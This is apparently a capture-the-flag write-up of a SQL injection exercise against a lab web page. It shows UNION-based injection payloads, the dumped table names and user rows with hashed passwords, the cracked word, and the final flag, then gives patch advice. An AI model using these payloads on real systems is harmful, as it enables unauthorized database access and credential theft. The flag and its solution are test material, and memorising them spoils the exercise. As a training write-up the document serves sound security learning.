# SQL Injection

On the page `http://192.168.56.2/?page=member`, we can write SQL command in the input field to get access to what is store in the database.

Making those commands will get us the flag.

```sql
1 UNION select table_name, column_name FROM information_Schema.columns
```
 This command gives us :

```
ID: 1 UNION select table_name, column_name FROM information_Schema.columns   
First name: users  
Surname : user_id

ID: 1 UNION select table_name, column_name FROM information_Schema.columns   
First name: users  
Surname : first_name

ID: 1 UNION select table_name, column_name FROM information_Schema.columns   
First name: users  
Surname : last_name

ID: 1 UNION select table_name, column_name FROM information_Schema.columns   
First name: users  
Surname : town

ID: 1 UNION select table_name, column_name FROM information_Schema.columns   
First name: users  
Surname : country

ID: 1 UNION select table_name, column_name FROM information_Schema.columns   
First name: users  
Surname : planet

ID: 1 UNION select table_name, column_name FROM information_Schema.columns   
First name: users  
Surname : Commentaire

ID: 1 UNION select table_name, column_name FROM information_Schema.columns   
First name: users  
Surname : countersign
```

Let's look closer at **users** using this command :

```sql
1=1 UNION SELECT user_id, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign ) FROM users
```

This last command gives us that:


```
ID: 1=1 UNION SELECT user_id, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign ) FROM users   
First name: one  
Surname : me

ID: 1=1 UNION SELECT user_id, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign ) FROM users   
First name: 1  
Surname : 1onemeParis FranceEARTHJe pense, donc je suis2b3366bcfd44f540e630d4dc2b9b06d9

ID: 1=1 UNION SELECT user_id, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign ) FROM users   
First name: 2  
Surname : 2twomeHelsinkiFinlandeEarthAamu on iltaa viisaampi.60e9032c586fb422e2c16dee6286cf10

ID: 1=1 UNION SELECT user_id, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign ) FROM users   
First name: 3  
Surname : 3threemeDublinIrlandeEarthDublin is a city of stories and secrets.e083b24a01c483437bcf4a9eea7c1b4d

ID: 1=1 UNION SELECT user_id, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign ) FROM users   
First name: 5  
Surname : 5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
```

The last one is really interesting. The word behind this md5 is **FortyTwo**. The sha256 of it gives us the flag.

** FLAG: 9995cae900a927ab1500d317dfcc52c0ad8a521bea878a8e9fa381b41459b646**
 
## DESCRIPTION

SQL Injection occurs when an attacker is able to manipulate a SQL query by injecting malicious SQL code into an input field, which the application then executes. This can lead to unauthorized access to the database, data leakage, data manipulation, and other serious security issues.

## PATCH

1.  **Input Validation**: Validate user inputs to ensure they conform to expected formats before processing them.
    
2.  **Least Privilege Principle**: Ensure the database user account used by your application has the minimum privileges necessary to perform its tasks.
    
3.  **Stored Procedures**: Use stored procedures to handle database operations, which can help prevent some types of SQL Injection attacks.
    
4.  **Web Application Firewalls (WAF)**: Deploy a WAF to detect and block SQL Injection attempts.

## DOC

- [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)